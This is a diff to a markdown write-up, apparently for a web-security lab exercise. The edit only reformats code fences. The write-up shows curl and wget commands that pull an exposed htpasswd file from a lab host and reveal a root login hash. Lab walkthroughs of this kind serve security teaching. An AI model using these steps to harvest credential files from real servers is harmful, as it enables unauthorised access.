@@ -2,7 +2,7 @@
 
 Go to <http://192.168.31.133/whatever/>
 
-`
+```
 daniseed@DESKTOP-87RT6O2:~/darkly$  curl -v 192.168.31.133/whatever/
 *   Trying 192.168.31.133:80...
 * TCP_NODELAY set
@@ -51,11 +51,11 @@ daniseed@DESKTOP-87RT6O2:~/darkly$  curl -v 192.168.31.133/whatever/
 <
 root:437394baff5aa33daa618be47b75cb49
 * Connection #0 to host 192.168.31.133 left intact
-`
+```
 
 OR
 
-`
+```
 daniseed@DESKTOP-87RT6O2:~/darkly$ wget http://192.168.31.133/whatever/htpasswd
 --2023-05-09 18:05:11--  http://192.168.31.133/whatever/htpasswd
 Connecting to 192.168.31.133:80... connected.
@@ -71,7 +71,7 @@ htpasswd                          100%[=========================================
 
 daniseed@DESKTOP-87RT6O2:~/darkly$ cat htpasswd
 root:437394baff5aa33daa618be47b75cb49
-`
+```
 
 We have login-password combination: `root:437394baff5aa33daa618be47b75cb49`
 
